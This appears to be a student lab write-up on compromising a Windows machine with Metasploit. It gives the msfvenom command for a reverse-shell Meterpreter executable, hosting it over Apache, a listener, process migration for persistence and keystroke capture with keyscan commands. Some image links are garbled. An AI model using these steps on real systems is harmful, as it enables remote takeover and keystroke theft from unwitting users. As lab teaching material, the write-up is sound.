# EX 6 Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands
## PROGRAM

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

![image](https://github.com/user-attachments/assets/467704aa-73d5-4a9c-904a-09cf7bad7db9)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/user-attachments/assets/1684ae6a-1a9a-481d-9684-47eac7f47a92)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/user-attachments/assets/0740668c-caea-4e67-bea1-62a0df3e78ae)

Start apache server sudo systemctl apache2 start

![image](https://github.com/user-attachments/assets/7f3852b6-f93c-4d76-8759-d6c73aab6456)

Check the status of apache2

![image](https://github.com/user-attachments/assets/c48fd79a-30bd-414e-8964-1c073d4ece6d)

Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
87b2-3ede-4fb4-ad00-07eff0c29eec)
Starting a command and control Server use multi/handler

![image](https://github.com/user-attachments/assets/c409

set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/user-attachments/assets/c23aceb7-463b-48b6-82de-900b3181174f)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/user-attachments/assets/ba2a68c3-d551-44e9-b778-d4fb9f9874b5)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/user-attachments/assets/97e75b0f-8a0b-4e76-9699-ac0669c25601)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![244990928-836e6efa-423f-4553-ad2f-19170b010892](https://github.com/user-attachments/assets/1aad975f-4829-4d93-aee9-d2ba0540c98c)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![244990952-35be18d7-51b0-4529-8fd8-76740f0c9ba6](https://github.com/user-attachments/assets/fd72c5aa-362d-4415-a5ef-33400b2fefa7)

keyscan_dump Shows the keystrokes captured so far
![244990920-d40a4428-0c65-4855-be1d-c278766082fb](https://github.com/user-attachments/assets/0fbad545-7264-4ad1-a9ca-1708b789d66a)

## RESULT:

The Metasploit framework is  used to compromise windows and is examined successfully.
